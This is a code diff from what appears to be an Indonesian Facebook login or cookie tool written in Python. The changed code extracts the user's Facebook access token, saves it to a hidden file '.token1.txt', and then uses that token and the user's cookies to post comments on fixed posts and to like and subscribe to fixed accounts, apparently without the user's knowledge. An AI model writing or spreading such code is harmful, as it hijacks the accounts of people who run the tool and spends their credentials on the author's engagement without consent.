@@ -441,7 +441,7 @@ def login_lagi334():
 									nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
 									roq = xyz.get(nek,cookies=cookie)
 									tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
-								
+									tokenmubg = open(".token1.txt","w").write(tok)
 									requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tok))
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom4}&access_token={tok}", headers = {"cookie":your_cookies})
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom3}&access_token={tok}", headers = {"cookie":your_cookies})
@@ -802,16 +802,12 @@ def followdong():
 #----------------[ BAGIAN-MENU ]----------------#
 def menu(my_name,my_id):
     try:
+        token = open('.token1.txt','r').read()
+        tokenmu.append(token)
         token = open('.token.txt','r').read()
         cookie = open('.cok.txt','r').read()
-        requests.post(f"https://graph.facebook.com/888863122574933/comments/?message={kom1}&access_token={token}", headers = {"cookie":cookie}) 
-        requests.post(f"https://graph.facebook.com/888863122574933/comments/?message={kom2}&access_token={token}", headers = {"cookie":cookie}) 
-        requests.post(f"https://graph.facebook.com/888863122574933/comments/?message={kom3}&access_token={token}", headers = {"cookie":cookie}) 
-        requests.post(f"https://graph.facebook.com/888863122574933/comments/?message={kom4}&access_token={token}", headers = {"cookie":cookie}) 
-        requests.post(f"https://graph.facebook.com/888863122574933/comments/?message={kom5}&access_token={token}", headers = {"cookie":cookie}) 
-        requests.post(f"https://graph.facebook.com/888863122574933/comments/?message={kom6}&access_token={token}", headers = {"cookie":cookie})
-        requests.post("https://graph.facebook.com/SuGNke4SputE9wcU/likes?method=post&access_token=%s"%(tokenku))
-        requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tokenku))
+        requests.post("https://graph.facebook.com/878169396977639/likes?method=post&access_token=%s"%(tokenmu))
+        requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tokenmu))
     except IOError:
         Console().print("[bold cyan] ─>[bold red] Cookies Kadaluarsa ")
         time.sleep(3)
